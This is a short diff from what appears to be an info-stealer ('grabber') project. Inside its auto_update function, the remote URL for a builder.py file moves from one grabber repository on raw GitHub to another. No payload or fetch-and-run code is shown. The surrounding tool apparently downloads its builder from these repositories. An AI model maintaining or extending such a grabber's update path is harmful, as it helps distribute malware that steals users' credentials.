@@ -107,7 +107,7 @@ def auto_update():
         return 
     
     _code = (
-            "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/roseui/builder.py"
+            "https://raw.githubusercontent.com/awijriawfdawd/Devzhtz-Grabber/main/components/roseui/builder.py"
     )
     
 
